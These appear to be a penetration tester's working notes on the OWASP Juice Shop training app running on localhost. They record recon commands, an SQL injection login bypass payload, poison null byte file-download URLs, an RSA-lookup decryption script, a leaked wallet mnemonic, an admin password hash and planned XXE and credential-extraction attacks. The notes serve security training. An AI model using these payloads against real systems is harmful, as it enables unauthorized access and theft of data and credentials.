# OWASP Juice Shop Working Notes

Target: OWASP Juice Shop  
URL: `http://localhost:3000`  
Date: 2026-05-04  
Tester: Max  
Purpose: Track reconnaissance, solved challenges, commands, evidence, and next attack paths.

## Current Status

The application is reachable on port `3000` and has been confirmed as OWASP Juice Shop. Admin access was obtained through SQL injection login bypass. The hidden scoreboard was found, `/ftp` was enumerated, backup files were downloaded with a poison null byte bypass, and the encrypted token sale announcement was decrypted.

Solved so far:

| Challenge | Category | How it was solved |
| --- | --- | --- |
| Error Handling | Security Misconfiguration | Triggered an unhandled application/API error during early probing. |
| Login Admin | Injection | Logged in as administrator using SQL injection in the login form. |
| Admin Section | Broken Access Control | Browsed to `/#/administration` after becoming admin. |
| Score Board | Miscellaneous | Found and opened `/#/score-board`. |
| Bully Chatbot | Miscellaneous | Obtained a coupon from the support chatbot. |
| Five-Star Feedback | Broken Access Control | Used admin access to remove 5-star feedback. |
| Poison Null Byte | Improper Input Validation | Downloaded restricted backup files from `/ftp` with `%2500.md`. |
| Forgotten Developer Backup | Sensitive Data Exposure | Downloaded `package.json.bak` via the poison null byte bypass. |
| Forgotten Sales Backup | Sensitive Data Exposure | Downloaded `coupons_2013.md.bak` via the poison null byte bypass. |
| Blockchain Hype | Security through Obscurity | Decrypted `announcement_encrypted.md` and opened the hidden token sale route. |

## Reconnaissance

Nmap identified one exposed service:

```text
3000/tcp open ppp?
```

The service fingerprint showed HTTP headers and HTML proving this is Juice Shop:

```text
HTTP/1.1 200 OK
<title>OWASP Juice Shop</title>
X-Recruiting: /#/jobs
```

The browser target is:

```text
http://localhost:3000
```

## Directory Discovery

Initial Gobuster against `http://TARGET:3000` failed because `TARGET` was a placeholder. Running against localhost worked, but Juice Shop returns the Angular single-page app for unknown frontend routes, producing false-positive `200` responses with length `75002`.

Working command:

```bash
gobuster dir \
  -u http://localhost:3000 \
  -w /usr/share/wordlists/dirb/common.txt \
  --exclude-length 75002
```

Interesting results:

```text
/api                  (Status: 500)
/apis                 (Status: 500)
/assets               (Status: 301)
/ftp                  (Status: 200)
/media                (Status: 301)
/profile              (Status: 500)
/promotion            (Status: 200)
/redirect             (Status: 500)
/rest                 (Status: 500)
/robots.txt           (Status: 200)
/video                (Status: 200)
/Video                (Status: 200)
```

Useful manual endpoints:

```text
http://localhost:3000/#/score-board
http://localhost:3000/#/administration
http://localhost:3000/ftp/
http://localhost:3000/robots.txt
http://localhost:3000/api/Challenges
http://localhost:3000/api/Users
http://localhost:3000/rest/admin/application-configuration
http://localhost:3000/rest/products/search?q=
```

## Admin Login

Admin access was obtained through SQL injection in the login form.

Payload used:

```text
Email: ' or 1=1--
Password: anything
```

After login, the admin section was accessible:

```text
http://localhost:3000/#/administration
```

This solved:

```text
Login Admin
Admin Section
```

## Scoreboard Discovery

The hidden scoreboard was opened at:

```text
http://localhost:3000/#/score-board
```

The API challenge list can also be pulled directly:

```bash
curl http://localhost:3000/api/Challenges
```

This solved:

```text
Score Board
```

## FTP Enumeration

The `/ftp` route looked empty in the browser, but direct HTML parsing showed exposed files:

```bash
curl -s http://localhost:3000/ftp/ | grep -Eo 'href="[^"]+"'
```

Files found:

```text
href="."
href="quarantine"
href="acquisitions.md"
href="announcement_encrypted.md"
href="coupons_2013.md.bak"
href="eastere.gg"
href="encrypt.pyc"
href="incident-support.kdbx"
href="legal.md"
href="package-lock.json.bak"
href="package.json.bak"
href="suspicious_errors.yml"
```

The quarantine folder also exposed shortcut files:

```bash
curl -s http://localhost:3000/ftp/quarantine/ | grep -Eo 'href="[^"]+"'
```

Output:

```text
href="./.."
href="."
href="."
href="juicy_malware_linux_amd_64.url"
href="juicy_malware_linux_arm_64.url"
href="juicy_malware_macos_64.url"
href="juicy_malware_windows_64.exe.url"
```

## Poison Null Byte Download Bypass

Restricted backup files were downloaded by appending a double-encoded null byte plus an allowed extension.

Commands:

```bash
curl -O "http://localhost:3000/ftp/package.json.bak%2500.md"
curl -O "http://localhost:3000/ftp/package-lock.json.bak%2500.md"
curl -O "http://localhost:3000/ftp/coupons_2013.md.bak%2500.md"
curl -O "http://localhost:3000/ftp/incident-support.kdbx%2500.md"
curl -O "http://localhost:3000/ftp/encrypt.pyc%2500.md"
```

This solved:

```text
Poison Null Byte
Forgotten Developer Backup
Forgotten Sales Backup
```

Coupon file output contained codes such as:

```text
n<MibgC7sn
mNYS#gC7sn
o*IVigC7sn
k#pDlgC7sn
```

## Token Sale Crypto

The encrypted announcement was downloaded:

```bash
curl -s http://localhost:3000/ftp/announcement_encrypted.md -o announcement_encrypted.md
```

The paired bytecode file contained useful strings:

```bash
strings encrypt.pyc%2500.md | head -80
```

Important strings:

```text
announcement.md
announcement_encrypted.md
confidential_document
encrypted_document
pow
ord
encrypt.py
```

Initial attempts with `sqrt(ciphertext)` and plain `pow(ord(char), exponent)` failed because the ciphertext uses RSA-style modular exponentiation. The working decryptor precomputed the ciphertext for printable characters using known RSA public parameters:

```bash
python3 - <<'PY'
from pathlib import Path

N = 145906768007583323230186939349070635292401872375357164399581871019873438799005358938369571402670149802121818086292467422828157022922076746906543401224889672472407926969987100581290103199317858753663710862357656510507883714297115637342788911463535102712032765166518411726859837988672111837205085526346618740053
e = 65537

charset = [chr(i) for i in range(33, 127)] + [" ", "\n", "\t"]
lookup = {str(pow(ord(c), e, N)): c for c in charset}

out = []
for line in Path("announcement_encrypted.md").read_text().splitlines():
    out.append(lookup.get(line.strip(), "?"))

print("".join(out))
PY
```

Decrypted result exposed:

```text
Major Announcement:

Token Sale - Initial Coin Offering
...
URL: /#/tokensale-ico-ea
```

Opening the route solved the token sale challenge:

```text
http://localhost:3000/#/tokensale-ico-ea
```

This solved:

```text
Blockchain Hype
```

## Application Visibility

Useful commands and workflows for seeing how the app works:

```bash
curl http://localhost:3000/robots.txt
curl http://localhost:3000/api/Challenges
curl http://localhost:3000/api/Users
curl http://localhost:3000/rest/admin/application-configuration
```

Browser DevTools:

- Application tab: inspect Local Storage and JWT/session values.
- Network tab: filter for `api`, `rest`, `graphql`, `socket`.
- Sources tab: inspect bundled JavaScript for hidden routes and client-side secrets.

Burp/ZAP proxy:

```text
HTTP proxy: 127.0.0.1
Port: 8080
```

Docker/container visibility, if running locally:

```bash
docker ps
docker logs -f <container_id>
docker exec -it <container_id> sh
```

## Feedback API Findings

The feedback API returns JSON with customer feedback records and several useful clues.

Notable response headers:

```text
Access-Control-Allow-Origin: *
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
Feature-Policy: payment 'self'
X-Recruiting: /#/jobs
Content-Type: application/json; charset=utf-8
```

Important observations from the response:

```json
{
  "UserId": 21,
  "id": 4,
  "comment": "Please send me the juicy chatbot NFT in my wallet at /juicy-nft : \"purpose betray marriage blame crunch monitor spin slide donate sport lift clutch\" (***ereum@juice-sh.op)",
  "rating": 1
}
```

This looks useful for Web3/NFT-related challenges:

```text
NFT Takeover
Mint the Honey Pot
Wallet Depletion
Web3 Sandbox
```

The same feedback response also contains an upload clue:

```json
{
  "UserId": null,
  "id": 5,
  "comment": "Incompetent customer support! Can't even upload photo of broken purchase!<br /><em>Support Team: Sorry, only order confirmation PDFs can be attached to complaints!</em> (anonymous)",
  "rating": 2
}
```

This suggests the complaint upload feature expects order confirmation PDFs and may be the correct place to test:

```text
Upload Size
Upload Type
XXE Data Access
XXE DoS
Memory Bomb
```

Feedback records also show user IDs, masked emails, comments, ratings, and timestamps. This is useful for access-control and API-only testing:

```text
Forged Feedback
API-only XSS
Server-side XSS Protection
CAPTCHA Bypass
Zero Stars
```

## File Upload Lead

There are upload-related challenges:

```text
Upload Size - Upload a file larger than 100 kB.
Upload Type - Upload a file that has no .pdf or .zip extension.
XXE Data Access - Retrieve /etc/passwd or C:\Windows\system.ini.
XXE DoS - Give the server something expensive to parse.
Memory Bomb - Drop explosive data into a vulnerable file-handling endpoint.
SSTi - Abuse arbitrary command execution to infect the server with juicy malware.
```

The upload feature may help with XML/YAML/file validation challenges, but a real reverse shell is not usually the main Juice Shop path. The safer next step is to identify the upload endpoint in DevTools/Burp, confirm accepted extensions and content types, then target the explicit upload challenges.

Record the upload endpoint here once found:

```text
Endpoint:
Method:
Content-Type:
Accepted extensions:
Max size behavior:
Response:
```

## Next High-Value Targets

Good next challenges to target:

| Challenge | Why it is a good next target |
| --- | --- |
| Password Hash Leak | Already admin; API excessive data exposure likely makes this quick. |
| Confidential Document | `/ftp/acquisitions.md` is exposed and should be tested directly. |
| Database Schema | Login/search SQLi path already confirmed. |
| User Credentials | Same SQLi path can likely exfiltrate users. |
| View Basket | Broken access control, usually ID manipulation. |
| Manipulate Basket | Builds on basket ID abuse. |
| Upload Size | Directly related to the discovered upload feature. |
| Upload Type | Directly related to upload validation bypass. |
| XXE Data Access | Likely via upload/import functionality. |
| Exposed Metrics | Easy observability endpoint discovery. |
| Privacy Policy | Easy low-difficulty completion. |
| Zero Stars | Input validation on feedback rating. |
| DOM XSS | Tutorial challenge, useful for XSS path. |

## Evidence Log

| Evidence ID | Date | Finding | Type | Location / Command |
| --- | --- | --- | --- | --- |
| EVID-001 | 2026-05-04 | Service identification | Nmap | `nmap -sV -p 3000 localhost` |
| EVID-002 | 2026-05-04 | Directory discovery | Gobuster | `gobuster dir -u http://localhost:3000 ... --exclude-length 75002` |
| EVID-003 | 2026-05-04 | FTP listing | curl | `curl -s http://localhost:3000/ftp/ \| grep -Eo 'href="[^"]+"'` |
| EVID-004 | 2026-05-04 | Quarantine listing | curl | `curl -s http://localhost:3000/ftp/quarantine/ \| grep -Eo 'href="[^"]+"'` |
| EVID-005 | 2026-05-04 | Null byte bypass | curl | `curl -O "...bak%2500.md"` |
| EVID-006 | 2026-05-04 | Crypto source hints | strings | `strings encrypt.pyc%2500.md \| head -80` |
| EVID-007 | 2026-05-04 | Token sale route | Python decrypt | RSA character lookup decryptor |
| EVID-008 | 2026-05-04 | Challenge inventory | API | `curl http://localhost:3000/api/Challenges` |
| EVID-009 | 2026-05-04 | Feedback API clues | API/Burp | Feedback JSON exposed NFT mnemonic and complaint upload hint |

## Rough Notes

- Unknown Angular routes return HTTP `200` with the app shell, so directory brute forcing needs response-length filtering.
- `/ftp` is a real sensitive data source even when the browser UI looks empty.
- `%2500.md` bypassed extension restrictions on backup files.
- The token sale route came from decrypted announcement content, not from brute forcing routes.
- Feedback API response exposed a Web3 mnemonic clue and a complaint upload hint.
- Upload functionality should be inspected with Burp before assuming it can lead to command execution.

- Possible admin password to de-hash = "0192023a7bbd73250516f069df18b500",
